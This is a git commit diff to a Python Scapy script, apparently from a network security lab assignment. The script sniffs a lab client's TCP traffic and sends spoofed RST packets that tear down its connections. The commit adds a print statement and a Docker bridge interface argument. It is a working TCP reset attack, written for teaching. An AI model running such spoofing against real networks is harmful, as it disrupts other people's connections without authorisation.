cfa855c7ad31b2298f93b2d54b4908a1bf06a336
Austin Tyler Conn <austinc3030@users.noreply.github.com>
2023-03-28 20:27:21 -0400

    Fix task 2 automated

--- src/task2_automated.py
+++ src/task2_automated.py
@@ -2,10 +2,11 @@
 from scapy.all import *
 import sys
 
-strClientIP = "10.9.0.6"
+strClientIP = '10.9.0.6'
 
 def spoof_tcp(pkt):
 
+    print(pkt[IP].src)
     lyrIP = IP(dst=strClientIP, src = pkt[IP].dst)
     lyrTCP = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
     
@@ -15,5 +16,9 @@ def spoof_tcp(pkt):
     # Send the spoofed packet
     send(pktSpoofedPacket, verbose=0)
 
+# NOTE: Without the iface argument, running inside a docker container leads to scapy not
+# sniffing properly. This argument MUST be changed to match the correct interface when
+# running on a different host.
 pkt = sniff(filter='tcp and src host {}'.format(strClientIP),
+            iface='br-e5b89a0c237d',
             prn=spoof_tcp)
